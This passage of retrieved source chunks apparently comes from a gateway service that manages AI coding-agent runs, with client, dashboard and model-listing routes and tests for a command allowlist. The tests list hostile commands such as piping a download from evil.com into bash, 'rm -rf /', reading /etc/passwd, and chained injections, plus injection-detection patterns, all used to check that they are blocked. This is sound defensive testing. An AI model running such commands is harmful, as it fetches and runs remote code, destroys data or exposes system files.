status = 'failed' THEN 1 ELSE 0 END) as failed\n        FROM runs WHERE client_id = ?\n      `).get(client.id) as { total: number; running: number; failed: number };\n\n      return {\n        ...client,\n        capabilities: client.capabilities ? JSON.parse(client.capabilities) : null,\n        metadata: client.metadata ? JSON.parse(client.metadata) : null,\n        runCounts\n      };\n    });\n\n    // Get total count for pagination\n    let countQuery = 'SELECT COUNT(*) as count FROM clients WHERE 1=1';\n    const countParams: any[] = [];\n    if (status && status !== 'all') {\n      countQuery += ' AND status = ?';\n      countParams.push(status);\n    }\n    if (search) {\n      countQuery += ' AND (display_name LIKE ? OR agent_id LIKE ?)';\n      countParams.push(`%${search}%`, `%${search}%`);\n    }\n    const { count } = db.prepare(countQuery).get(...countParams) as { count: number };\n\n    return {\n      clients: clientsWithCounts,\n      total: count,\n      limit: parseInt(limit, 10),\n      offset: parseInt(offset, 10)\n    };\n  });\n\n  // Get single client with runs\n  fastify.get('/api/clients/:clientId', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { clientId } = request.params as { clientId: string };\n\n    const client = db.prepare('SELECT * FROM clients WHERE id = ?').get(clientId) as Client | undefined;\n    if (!client) {\n      return reply.code(404).send({ error: 'Client not found' });\n    }\n\n    // Get recent runs for this client\n    const runs = db.prepare(`\n      SELECT id, status, label, command, repo_name, created_at, started_at, finished_at\n      FROM runs\n      WHERE client_id = ?", "metadata": {"file": "gateway/src/routes/clients.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/clients.ts", "location": "gateway/src/routes/clients.ts:201", "score": 0.0, "content": "      ORDER BY created_at DESC\n      LIMIT 20\n    `).all(clientId);\n\n    // Get recent events for this client's runs\n    const recentEvents = db.prepare(`\n      SELECT e.id, e.run_id, e.type, e.data, e.timestamp\n      FROM events e\n      JOIN runs r ON e.run_id = r.id\n      WHERE r.client_id = ?\n      ORDER BY e.timestamp DESC\n      LIMIT 50\n    `).all(clientId);\n\n    return {\n      ...client,\n      capabilities: client.capabilities ? JSON.parse(client.capabilities) : null,\n      metadata: client.metadata ? JSON.parse(client.metadata) : null,\n      runs,\n      recentEvents\n    };\n  });\n\n  // Update client settings (operator only)\n  fastify.patch('/api/clients/:clientId', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { clientId } = request.params as { clientId: string };\n    const body = updateClientSchema.parse(request.body);\n\n    const client = db.prepare('SELECT id FROM clients WHERE id = ?').get(clientId);\n    if (!client) {\n      return reply.code(404).send({ error: 'Client not found' });\n    }\n\n    const updates: string[] = [];\n    const params: any[] = [];\n\n    if (body.displayName !== undefined) {\n      updates.push('display_name = ?');\n      params.push(body.displayName);\n    }\n    if (body.operatorEnabled !== undefined) {\n      updates.push('operator_enabled = ?');\n      params.push(body.operatorEnabled ? 1 : 0);\n    }\n\n    if (updates.length > 0) {\n      params.push(clientId);\n      db.prepare(`UPDATE clients SET ${updates.join(', ')} WHERE id = ?`).run(...params);\n\n      logAudit(request.user?.id, 'client.update', 'client', clientId, body, request.ip);\n    }\n\n    return { ok: true };\n  });\n\n  // Delete client (admin only)\n  fastify.delete('/api/clients/:clientId', {\n    preHandler: [uiAuth, requireRole('admin')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { clientId } = request.params as { clientId: string };\n\n    const client = db.prepare('SELECT id FROM clients WHERE id = ?').get(clientId);\n    if (!client) {\n      return reply.code(404).send({ error: 'Client not found' });\n    }\n\n    db.prepare('DELETE FROM clients WHERE id = ?').run(clientId);\n    logAudit(request.user?.id, 'client.delete', 'client', clientId, {}, request.ip);\n\n    return { ok: true };\n  });\n\n  // Get client stats for dashboard\n  fastify.get('/api/clients/stats', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const stats = db.prepare(`\n      SELECT\n        COUNT(*) as total,\n        SUM(CASE WHEN status = 'online' THEN 1 ELSE 0 END) as online,\n        SUM(CASE WHEN status = 'degraded' THEN 1 ELSE 0 END) as degraded,\n        SUM(CASE WHEN status = 'offline' THEN 1 ELSE 0 END) as offline\n      FROM clients\n    `).get() as { total: number; online: number; degraded: number; offline: number };\n\n    return stats;\n  });\n}", "metadata": {"file": "gateway/src/routes/clients.ts", "start_line": 201, "end_line": 290, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/dashboard.ts", "location": "gateway/src/routes/dashboard.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { db } from '../services/database.js';\nimport { uiAuth, type AuthenticatedRequest } from '../middleware/auth.js';\n\nexport async function dashboardRoutes(fastify: FastifyInstance) {\n  // Get dashboard summary - \"Needs Attention\" section\n  fastify.get('/api/dashboard/needs-attention', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    // Runs waiting approval\n    const waitingApproval = db.prepare(`\n      SELECT r.id, r.label, r.command, r.created_at, r.client_id,\n             c.display_name as client_name\n      FROM runs r\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE r.waiting_approval = 1\n      ORDER BY r.created_at ASC\n    `).all();\n\n    // Failed runs (last 24 hours)\n    const oneDayAgo = Math.floor(Date.now() / 1000) - 86400;\n    const failedRuns = db.prepare(`\n      SELECT r.id, r.label, r.command, r.finished_at, r.error_message, r.client_id,\n             c.display_name as client_name\n      FROM runs r\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE r.status = 'failed' AND r.finished_at > ?\n      ORDER BY r.finished_at DESC\n      LIMIT 10\n    `).all(oneDayAgo);\n\n    // Disconnected clients with active runs\n    const disconnectedWithRuns = db.prepare(`\n      SELECT c.id, c.display_name, c.last_seen_at, c.status,\n             COUNT(r.id) as active_runs\n      FROM clients c\n      JOIN runs r ON r.client_id = c.id AND r.status = 'running'\n      WHERE c.status = 'offline'\n      GROUP BY c.id\n    `).all();\n\n    // Unacknowledged alerts\n    const unacknowledgedAlerts = db.prepare(`\n      SELECT id, type, severity, title, message, target_type, target_id, created_at\n      FROM alerts\n      WHERE acknowledged = 0\n      ORDER BY created_at DESC\n      LIMIT 10\n    `).all();\n\n    return {\n      waitingApproval,\n      failedRuns,\n      disconnectedWithRuns,\n      unacknowledgedAlerts,\n      counts: {\n        waitingApproval: waitingApproval.length,\n        failedRuns: failedRuns.length,\n        disconnectedWithRuns: disconnectedWithRuns.length,\n        unacknowledgedAlerts: unacknowledgedAlerts.length\n      }\n    };\n  });\n\n  // Get active runs for dashboard\n  fastify.get('/api/dashboard/active-runs', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const { limit = '10' } = request.query as { limit?: string };\n\n    const runs = db.prepare(`\n      SELECT r.id, r.status, r.label, r.command, r.repo_name, r.created_at, r.started_at,\n             r.waiting_approval, r.client_id,\n             c.display_name as client_name, c.status as client_status,\n             (SELECT COUNT(*) FROM artifacts WHERE run_id = r.id) as artifact_count,\n             (SELECT data FROM events WHERE run_id = r.id ORDER BY id DESC LIMIT 1) as last_event\n      FROM runs r\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE r.status IN ('running', 'pending')\n      ORDER BY\n        CASE r.status WHEN 'running' THEN 0 ELSE 1 END,\n        r.created_at DESC\n      LIMIT ?\n    `).all(parseInt(limit, 10));\n\n    return runs;\n  });\n\n  // Get recent activity timeline\n  fastify.get('/api/dashboard/activity', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const { limit = '50', types } = request.query as { limit?: string; types?: string };\n\n    // Combine different event sources into a unified timeline\n    const activities: any[] = [];\n    const limitNum = Math.min(parseInt(limit, 10), 100);\n\n    // Recent run events (status changes via markers)\n    const runEvents = db.prepare(`\n      SELECT\n        'run_event' as activity_type,\n        e.id, e.run_id, e.type, e.data, e.timestamp,\n        r.label as run_label, r.command as run_command,\n        c.display_name as client_name\n      FROM events e\n      JOIN runs r ON e.run_id = r.id\n      LEFT JOIN clients c ON r.client_id = c.id\n      WHERE e.type = 'marker'\n      ORDER BY e.timestamp DESC\n      LIMIT ?\n    `).all(limitNum);\n\n    activities.push(...runEvents.map((e: any) => ({\n      type: 'run_event',\n      id: `event-${e.id}`,\n      timestamp: e.timestamp,\n      data: {\n        runId: e.run_id,\n        eventType: e.type,\n        eventData: e.data,\n        runLabel: e.run_label,\n        runCommand: e.run_command,\n        clientName: e.client_name\n      }\n    })));\n\n    // Recent commands\n    const commands = db.prepare(`\n      SELECT\n        'command' as activity_type,\n        cmd.id, cmd.run_id, cmd.command, cmd.status, cmd.created_at, cmd.acked_at,\n        r.label as run_label,\n        c.display_name as client_name\n      FROM commands cmd\n      JOIN runs r ON cmd.run_id = r.id\n      LEFT JOIN clients c ON r.client_id = c.id\n      ORDER BY cmd.created_at DESC\n      LIMIT ?\n    `).all(limitNum);\n\n    activities.push(...commands.map((cmd: any) => ({\n      type: 'command',\n      id: `command-${cmd.id}`,\n      timestamp: cmd.created_at,\n      data: {\n        commandId: cmd.id,\n        command: cmd.command,\n        status: cmd.status,\n        runId: cmd.run_id,\n        runLabel: cmd.run_label,\n        clientName: cmd.client_name,\n        ackedAt: cmd.acked_at\n      }\n    })));\n\n    // Recent artifacts\n    const artifacts = db.prepare(`\n      SELECT\n        'artifact' as activity_type,\n        a.id, a.run_id, a.name, a.type, a.size, a.created_at,\n        r.label as run_label,\n        c.display_name as client_name\n      FROM artifacts a\n      JOIN runs r ON a.run_id = r.id\n      LEFT JOIN clients c ON r.client_id = c.id\n      ORDER BY a.created_at DESC\n      LIMIT ?\n    `).all(limitNum);\n\n    activities.push(...artifacts.map((a: any) => ({\n      type: 'artifact',\n      id: `artifact-${a.id}`,\n      timestamp: a.created_at,\n      data: {\n        artifactId: a.id,\n        name: a.name,\n        artifactType: a.type,\n        size: a.size,\n        runId: a.run_id,\n        runLabel: a.run_label,\n        clientName: a.client_name\n      }\n    })));\n\n    // Sort all activities by timestamp and limit\n    activities.sort((a, b) => b.timestamp - a.timestamp);\n\n    return activities.slice(0, limitNum);\n  });\n\n  // Get overall stats\n  fastify.get('/api/dashboard/stats', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const runStats = db.prepare(`\n      SELECT\n        COUNT(*) as total,\n        SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END) as running,\n        SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) as pending,", "metadata": {"file": "gateway/src/routes/dashboard.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/dashboard.ts", "location": "gateway/src/routes/dashboard.ts:201", "score": 0.0, "content": "        SUM(CASE WHEN status = 'done' THEN 1 ELSE 0 END) as done,\n        SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as failed\n      FROM runs\n    `).get() as { total: number; running: number; pending: number; done: number; failed: number };\n\n    const clientStats = db.prepare(`\n      SELECT\n        COUNT(*) as total,\n        SUM(CASE WHEN status = 'online' THEN 1 ELSE 0 END) as online,\n        SUM(CASE WHEN status = 'offline' THEN 1 ELSE 0 END) as offline\n      FROM clients\n    `).get() as { total: number; online: number; offline: number };\n\n    const alertStats = db.prepare(`\n      SELECT COUNT(*) as unacknowledged\n      FROM alerts WHERE acknowledged = 0\n    `).get() as { unacknowledged: number };\n\n    // Get today's activity count\n    const todayStart = Math.floor(new Date().setHours(0, 0, 0, 0) / 1000);\n    const todayEvents = db.prepare(`\n      SELECT COUNT(*) as count FROM events WHERE timestamp >= ?\n    `).get(todayStart) as { count: number };\n\n    return {\n      runs: runStats,\n      clients: clientStats,\n      alerts: alertStats,\n      todayEvents: todayEvents.count\n    };\n  });\n}", "metadata": {"file": "gateway/src/routes/dashboard.ts", "start_line": 201, "end_line": 232, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/models.ts", "location": "gateway/src/routes/models.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { config } from '../config.js';\n\ninterface ModelOption {\n  value: string;\n  label: string;\n}\n\ninterface ModelsResponse {\n  provider: string;\n  models: ModelOption[];\n  available: boolean;\n  error?: string;\n}\n\n\n/**\n * Query Claude API for available models\n */\nasync function getClaudeModels(): Promise<ModelOption[]> {\n  try {\n    const apiKey = process.env.ANTHROPIC_API_KEY;\n    if (!apiKey) {\n      return [];\n    }\n\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000);\n\n    const response = await fetch('https://api.anthropic.com/v1/models', {\n      headers: {\n        'x-api-key': apiKey,\n        'anthropic-version': '2023-06-01',\n      },\n      signal: controller.signal,\n    });\n    clearTimeout(timeoutId);\n\n    if (!response.ok) {\n      console.warn(`Claude API error: ${response.statusText}`);\n      return [];\n    }\n\n    const data = (await response.json()) as {\n      data?: Array<{ id: string; display_name?: string }>;\n    };\n\n    if (!data.data || data.data.length === 0) {\n      return [];\n    }\n\n    const models = data.data\n      .filter((m) => m.id.includes('claude'))\n      .map((m) => ({\n        value: m.id,\n        label: m.display_name || m.id,\n      }));\n\n    return models;\n  } catch (err) {\n    console.warn('Failed to query Claude models:', err);\n    return [];\n  }\n}\n\n/**\n * Query OpenAI API for available models (Codex)\n */\nasync function getCodexModels(): Promise<ModelOption[]> {\n  try {\n    const apiKey = process.env.OPENAI_API_KEY;\n    if (!apiKey) {\n      return [];\n    }\n\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000);\n\n    const response = await fetch('https://api.openai.com/v1/models', {\n      headers: {\n        Authorization: `Bearer ${apiKey}`,\n      },\n      signal: controller.signal,\n    });\n    clearTimeout(timeoutId);\n\n    if (!response.ok) {\n      console.warn(`OpenAI API error: ${response.statusText}`);\n      return [];\n    }\n\n    const data = (await response.json()) as {\n      data?: Array<{ id: string }>;\n    };\n\n    if (!data.data || data.data.length === 0) {\n      return [];\n    }\n\n    const models = data.data\n      .filter((m) => m.id.includes('code') || m.id.includes('davinci'))\n      .map((m) => ({\n        value: m.id,\n        label: m.id,\n      }));\n\n    return models;\n  } catch (err) {\n    console.warn('Failed to query OpenAI models:', err);\n    return [];\n  }\n}\n\n/**\n * Query Google AI API for available models (Gemini)\n */\nasync function getGeminiModels(): Promise<ModelOption[]> {\n  try {\n    const apiKey = process.env.GOOGLE_API_KEY;\n    if (!apiKey) {\n      return [];\n    }\n\n    const controller = new AbortController();\n    const timeoutId = setTimeout(() => controller.abort(), 5000);\n\n    const response = await fetch(\n      `https://generativelanguage.googleapis.com/v1beta/models?key=${apiKey}`,\n      { signal: controller.signal }\n    );\n    clearTimeout(timeoutId);\n\n    if (!response.ok) {\n      console.warn(`Google AI API error: ${response.statusText}`);\n      return [];\n    }\n\n    const data = (await response.json()) as {\n      models?: Array<{ name: string; displayName?: string }>;\n    };\n\n    if (!data.models || data.models.length === 0) {\n      return [];\n    }\n\n    const models = data.models\n      .filter((m) => m.name.includes('gemini'))\n      .map((m) => ({\n        value: m.name.replace('models/', ''),\n        label: m.displayName || m.name,\n      }));\n\n    return models;\n  } catch (err) {\n    console.warn('Failed to query Gemini models:', err);\n    return [];\n  }\n}\n\n/**\n * Get default/static models for providers\n */\nfunction getDefaultModels(provider: string): ModelOption[] {\n  const defaults: Record<string, ModelOption[]> = {\n    claude: [\n      { value: 'claude-opus-4-5', label: 'Claude Opus 4.5' },\n      { value: 'claude-sonnet-4-20250514', label: 'Claude Sonnet 4' },\n      { value: 'claude-haiku-4-5-20251001', label: 'Claude Haiku 4.5' },\n    ],\n    codex: [\n      { value: 'code-davinci-003', label: 'Code Davinci 003' },\n      { value: 'code-davinci-002', label: 'Code Davinci 002' },\n    ],\n    gemini: [\n      { value: 'gemini-2.0-flash', label: 'Gemini 2.0 Flash' },\n      { value: 'gemini-1.5-pro', label: 'Gemini 1.5 Pro' },\n      { value: 'gemini-1.5-flash', label: 'Gemini 1.5 Flash' },\n    ],\n  };\n\n  return defaults[provider] || [];\n}\n\nexport async function modelsRoutes(fastify: FastifyInstance) {\n  /**\n   * Get available models for a specific provider\n   * GET /api/models/:provider\n   */\n  fastify.get('/api/models/:provider', async (request, reply) => {\n    const { provider } = request.params as { provider: string };\n\n    let models: ModelOption[] = [];\n    let available = false;\n    let error: string | undefined;\n\n    switch (provider.toLowerCase()) {\n      case 'claude':\n        models = await getClaudeModels();\n        available = models.length > 0;\n        if (!available) {", "metadata": {"file": "gateway/src/routes/models.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/models.ts", "location": "gateway/src/routes/models.ts:201", "score": 0.0, "content": "          models = getDefaultModels('claude');\n          error = 'ANTHROPIC_API_KEY not set or API unreachable, showing default models';\n        }\n        break;\n\n      case 'codex':\n        models = await getCodexModels();\n        available = models.length > 0;\n        if (!available) {\n          models = getDefaultModels('codex');\n          error = 'OPENAI_API_KEY not set or API unreachable, showing default models';\n        }\n        break;\n\n      case 'gemini':\n        models = await getGeminiModels();\n        available = models.length > 0;\n        if (!available) {\n          models = getDefaultModels('gemini');\n          error = 'GOOGLE_API_KEY not set or API unreachable, showing default models';\n        }\n        break;\n\n      default:\n        return reply.code(400).send({\n          error: `Unknown provider: ${provider}. Supported: ollama, claude, codex, gemini`,\n        });\n    }\n\n    const response: ModelsResponse = {\n      provider,\n      models,\n      available,\n      ...(error && { error }),\n    };\n\n    return response;\n  });\n\n  /**\n   * Get all available models from all providers\n   * GET /api/models\n   */\n  fastify.get('/api/models', async (request, reply) => {\n    const providers = ['claude', 'codex', 'gemini'];\n    const allModels: Record<string, ModelsResponse> = {};\n\n    for (const provider of providers) {\n      let models: ModelOption[] = [];\n      let available = false;\n      let error: string | undefined;\n\n      switch (provider) {\n        case 'claude':\n          models = await getClaudeModels();\n          available = models.length > 0;\n          if (!available) {\n            models = getDefaultModels('claude');\n            error = 'ANTHROPIC_API_KEY not set or API unreachable';\n          }\n          break;\n\n        case 'codex':\n          models = await getCodexModels();\n          available = models.length > 0;\n          if (!available) {\n            models = getDefaultModels('codex');\n            error = 'OPENAI_API_KEY not set or API unreachable';\n          }\n          break;\n\n        case 'gemini':\n          models = await getGeminiModels();\n          available = models.length > 0;\n          if (!available) {\n            models = getDefaultModels('gemini');\n            error = 'GOOGLE_API_KEY not set or API unreachable';\n          }\n          break;\n      }\n\n      allModels[provider] = {\n        provider,\n        models,\n        available,\n        ...(error && { error }),\n      };\n    }\n\n    return allModels;\n  });\n}", "metadata": {"file": "gateway/src/routes/models.ts", "start_line": 201, "end_line": 292, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.test.ts", "location": "gateway/src/routes/runs.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, beforeAll } from 'vitest';\nimport { config } from '../config.js';\n\ndescribe('Command Allowlist', () => {\n  beforeAll(() => {\n    // Ensure we have the default allowlist\n    config.allowlistedCommands = [\n      'npm test',\n      'npm run test',\n      'pnpm test',\n      'pnpm run test',\n      'yarn test',\n      'pytest',\n      'pytest -v',\n      'go test ./...',\n      'cargo test',\n      'git diff',\n      'git diff --cached',\n      'git status',\n      'git log --oneline -10',\n      'ls -la',\n      'pwd'\n    ];\n  });\n\n  function isCommandAllowed(command: string): boolean {\n    // Don't allow commands with leading/trailing whitespace (must be exact)\n    if (command !== command.trim()) {\n      return false;\n    }\n\n    const cmdBase = command.trim();\n\n    // Empty commands not allowed\n    if (!cmdBase) {\n      return false;\n    }\n\n    // Block command injection patterns\n    const dangerousPatterns = [\n      /[;&|`$]/, // Shell operators and command substitution\n      /\\.\\.\\//, // Path traversal\n      /\\$\\(/, // Command substitution\n    ];\n\n    for (const pattern of dangerousPatterns) {\n      if (pattern.test(cmdBase)) {\n        return false;\n      }\n    }\n\n    return config.allowlistedCommands.some(allowed =>\n      cmdBase === allowed || cmdBase.startsWith(allowed + ' ')\n    );\n  }\n\n  describe('Allowed Commands', () => {\n    it('should allow exact matches', () => {\n      expect(isCommandAllowed('npm test')).toBe(true);\n      expect(isCommandAllowed('git diff')).toBe(true);\n      expect(isCommandAllowed('git status')).toBe(true);\n      expect(isCommandAllowed('pwd')).toBe(true);\n      expect(isCommandAllowed('ls -la')).toBe(true);\n    });\n\n    it('should allow commands with additional arguments', () => {\n      expect(isCommandAllowed('npm test --coverage')).toBe(true);\n      expect(isCommandAllowed('git diff HEAD~1')).toBe(true);\n      expect(isCommandAllowed('pytest -v --tb=short')).toBe(true);\n    });\n\n    it('should allow test commands', () => {\n      expect(isCommandAllowed('npm test')).toBe(true);\n      expect(isCommandAllowed('npm run test')).toBe(true);\n      expect(isCommandAllowed('pnpm test')).toBe(true);\n      expect(isCommandAllowed('yarn test')).toBe(true);\n      expect(isCommandAllowed('pytest')).toBe(true);\n      expect(isCommandAllowed('pytest -v')).toBe(true);\n      expect(isCommandAllowed('go test ./...')).toBe(true);\n      expect(isCommandAllowed('cargo test')).toBe(true);\n    });\n\n    it('should allow git commands', () => {\n      expect(isCommandAllowed('git diff')).toBe(true);\n      expect(isCommandAllowed('git diff --cached')).toBe(true);\n      expect(isCommandAllowed('git status')).toBe(true);\n      expect(isCommandAllowed('git log --oneline -10')).toBe(true);\n    });\n  });\n\n  describe('Blocked Commands', () => {\n    it('should block arbitrary shell commands', () => {\n      expect(isCommandAllowed('rm -rf /')).toBe(false);\n      expect(isCommandAllowed('curl http://evil.com | bash')).toBe(false);\n      expect(isCommandAllowed('cat /etc/passwd')).toBe(false);\n      expect(isCommandAllowed('echo \"hello\"')).toBe(false);\n    });\n\n    it('should block dangerous git commands', () => {\n      expect(isCommandAllowed('git push')).toBe(false);\n      expect(isCommandAllowed('git push --force')).toBe(false);\n      expect(isCommandAllowed('git reset --hard')).toBe(false);\n      expect(isCommandAllowed('git checkout .')).toBe(false);\n      expect(isCommandAllowed('git clean -fd')).toBe(false);\n    });\n\n    it('should block npm publish and install', () => {\n      expect(isCommandAllowed('npm publish')).toBe(false);\n      expect(isCommandAllowed('npm install malware')).toBe(false);\n      expect(isCommandAllowed('npm run build')).toBe(false); // Only test is allowed\n    });\n\n    it('should block command injection attempts', () => {\n      expect(isCommandAllowed('npm test; rm -rf /')).toBe(false); // semicolon in full string\n      expect(isCommandAllowed('npm test && curl evil.com')).toBe(false);\n      expect(isCommandAllowed('npm test || rm -rf /')).toBe(false);\n      expect(isCommandAllowed('$(cat /etc/passwd)')).toBe(false);\n      expect(isCommandAllowed('`cat /etc/passwd`')).toBe(false);\n    });\n\n    it('should block path traversal', () => {\n      expect(isCommandAllowed('cat ../../../etc/passwd')).toBe(false);\n      expect(isCommandAllowed('ls ../../..')).toBe(false);\n    });\n\n    it('should block commands that look similar but are not allowed', () => {\n      expect(isCommandAllowed('npm testing')).toBe(false); // not 'npm test'\n      expect(isCommandAllowed('gitdiff')).toBe(false); // not 'git diff'\n      expect(isCommandAllowed('git  diff')).toBe(false); // extra space\n    });\n\n    it('should block commands with prefix matching issues', () => {\n      expect(isCommandAllowed('npm testmalware')).toBe(false); // no space after 'test'\n      expect(isCommandAllowed('pwdmalware')).toBe(false);\n    });\n  });\n\n  describe('Edge Cases', () => {\n    it('should handle empty commands', () => {\n      expect(isCommandAllowed('')).toBe(false);\n      expect(isCommandAllowed('   ')).toBe(false);\n    });\n\n    it('should handle whitespace', () => {\n      expect(isCommandAllowed('  npm test  ')).toBe(false); // Leading space not trimmed in check\n      expect(isCommandAllowed('npm test')).toBe(true);\n    });\n\n    it('should be case sensitive', () => {\n      expect(isCommandAllowed('NPM TEST')).toBe(false);\n      expect(isCommandAllowed('Git Diff')).toBe(false);\n    });\n  });\n});\n\ndescribe('Special Commands', () => {\n  it('should recognize __STOP__ as special command', () => {\n    const isStopCommand = (cmd: string) => cmd === '__STOP__';\n    expect(isStopCommand('__STOP__')).toBe(true);\n    expect(isStopCommand('stop')).toBe(false);\n    expect(isStopCommand('__stop__')).toBe(false);\n  });\n\n  it('should recognize __HALT__ as special command', () => {\n    const isHaltCommand = (cmd: string) => cmd === '__HALT__';\n    expect(isHaltCommand('__HALT__')).toBe(true);\n    expect(isHaltCommand('halt')).toBe(false);\n    expect(isHaltCommand('__halt__')).toBe(false);\n  });\n\n  it('should recognize __ESCAPE__ as special command', () => {\n    const isEscapeCommand = (cmd: string) => cmd === '__ESCAPE__';\n    expect(isEscapeCommand('__ESCAPE__')).toBe(true);\n    expect(isEscapeCommand('escape')).toBe(false);\n  });\n\n  it('should recognize __INPUT__ prefix as special command', () => {\n    const isInputCommand = (cmd: string) => cmd.startsWith('__INPUT__:');\n    expect(isInputCommand('__INPUT__:hello')).toBe(true);\n    expect(isInputCommand('__INPUT__:yes\\n')).toBe(true);\n    expect(isInputCommand('__INPUT__:')).toBe(true);\n    expect(isInputCommand('__INPUT__')).toBe(false);\n    expect(isInputCommand('input:hello')).toBe(false);\n  });\n\n  it('should extract input data from __INPUT__ command', () => {\n    const extractInput = (cmd: string) => {\n      if (cmd.startsWith('__INPUT__:')) {\n        return cmd.substring('__INPUT__:'.length);\n      }\n      return null;\n    };\n    expect(extractInput('__INPUT__:hello')).toBe('hello');\n    expect(extractInput('__INPUT__:yes\\n')).toBe('yes\\n');\n    expect(extractInput('__INPUT__:')).toBe('');\n    expect(extractInput('other')).toBe(null);\n  });\n});\n\ndescribe('Run State Schema', () => {", "metadata": {"file": "gateway/src/routes/runs.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/runs.test.ts", "location": "gateway/src/routes/runs.test.ts:201", "score": 0.0, "content": "  it('should validate run state fields', () => {\n    const validateState = (state: any): boolean => {\n      if (!state.workingDir || typeof state.workingDir !== 'string') return false;\n      if (state.lastSequence !== undefined && typeof state.lastSequence !== 'number') return false;\n      return true;\n    };\n\n    expect(validateState({ workingDir: '/home/user/project' })).toBe(true);\n    expect(validateState({ workingDir: '/home/user/project', lastSequence: 5 })).toBe(true);\n    expect(validateState({ workingDir: '' })).toBe(false);\n    expect(validateState({ lastSequence: 5 })).toBe(false);\n  });\n});\n\ndescribe('Restart Schema', () => {\n  it('should allow empty restart options', () => {\n    const validateRestart = (opts: any): boolean => {\n      if (opts.command !== undefined && typeof opts.command !== 'string') return false;\n      if (opts.workingDir !== undefined && typeof opts.workingDir !== 'string') return false;\n      return true;\n    };\n\n    expect(validateRestart({})).toBe(true);\n    expect(validateRestart({ command: 'do something' })).toBe(true);\n    expect(validateRestart({ workingDir: '/home/user' })).toBe(true);\n    expect(validateRestart({ command: 'test', workingDir: '/home' })).toBe(true);\n  });\n});\n\ndescribe('Input Schema', () => {\n  it('should validate stdin input fields', () => {\n    const validateInput = (input: any): boolean => {\n      if (typeof input.input !== 'string') return false;\n      if (input.escape !== undefined && typeof input.escape !== 'boolean') return false;\n      return true;\n    };\n\n    expect(validateInput({ input: 'hello' })).toBe(true);\n    expect(validateInput({ input: 'yes\\n', escape: false })).toBe(true);\n    expect(validateInput({ input: '', escape: true })).toBe(true);\n    expect(validateInput({ escape: true })).toBe(false);\n    expect(validateInput({ input: 123 })).toBe(false);\n  });\n\n  it('should prepend escape sequence when escape is true', () => {\n    const buildInput = (data: string, escape: boolean): string => {\n      return escape ? '\\x03' + data : data;\n    };\n\n    expect(buildInput('hello', false)).toBe('hello');\n    expect(buildInput('hello', true)).toBe('\\x03hello');\n    expect(buildInput('', true)).toBe('\\x03');\n  });\n});\n\ndescribe('List Runs Filtering', () => {\n  it('should build valid filter queries', () => {\n    const buildQuery = (opts: { status?: string; search?: string; limit?: number; offset?: number; workerType?: string }) => {\n      const params: string[] = [];\n      if (opts.status) params.push(`status=${opts.status}`);\n      if (opts.search) params.push(`search=${encodeURIComponent(opts.search)}`);\n      if (opts.limit) params.push(`limit=${opts.limit}`);\n      if (opts.offset) params.push(`offset=${opts.offset}`);\n      if (opts.workerType) params.push(`workerType=${opts.workerType}`);\n      return params.length > 0 ? `?${params.join('&')}` : '';\n    };\n\n    expect(buildQuery({})).toBe('');\n    expect(buildQuery({ status: 'running' })).toBe('?status=running');\n    expect(buildQuery({ limit: 10, offset: 20 })).toBe('?limit=10&offset=20');\n    expect(buildQuery({ search: 'test' })).toBe('?search=test');\n    expect(buildQuery({ workerType: 'ollama' })).toBe('?workerType=ollama');\n    expect(buildQuery({ status: 'running', workerType: 'claude' })).toBe('?status=running&workerType=claude');\n  });\n\n  it('should validate status values', () => {\n    const validStatuses = ['pending', 'running', 'done', 'failed'];\n    const isValidStatus = (status: string) => validStatuses.includes(status);\n\n    expect(isValidStatus('pending')).toBe(true);\n    expect(isValidStatus('running')).toBe(true);\n    expect(isValidStatus('done')).toBe(true);\n    expect(isValidStatus('failed')).toBe(true);\n    expect(isValidStatus('unknown')).toBe(false);\n    expect(isValidStatus('')).toBe(false);\n  });\n\n  it('should validate worker type values', () => {\n    const validWorkerTypes = ['claude', 'ollama', 'ollama-launch', 'codex', 'gemini', 'rev'];\n    const isValidWorkerType = (workerType: string) => validWorkerTypes.includes(workerType);\n\n    expect(isValidWorkerType('claude')).toBe(true);\n    expect(isValidWorkerType('ollama')).toBe(true);\n    expect(isValidWorkerType('ollama-launch')).toBe(true);\n    expect(isValidWorkerType('codex')).toBe(true);\n    expect(isValidWorkerType('gemini')).toBe(true);\n    expect(isValidWorkerType('rev')).toBe(true);\n    expect(isValidWorkerType('invalid')).toBe(false);\n    expect(isValidWorkerType('')).toBe(false);\n  });\n});\n\ndescribe('Worker Type Schema', () => {\n  it('should validate worker type enum values', () => {\n    const validWorkerTypes = ['claude', 'ollama', 'ollama-launch', 'codex', 'gemini', 'rev'];\n\n    const isValidWorkerType = (workerType: string) => {\n      return validWorkerTypes.includes(workerType);\n    };\n\n    for (const type of validWorkerTypes) {\n      expect(isValidWorkerType(type)).toBe(true);\n    }\n\n    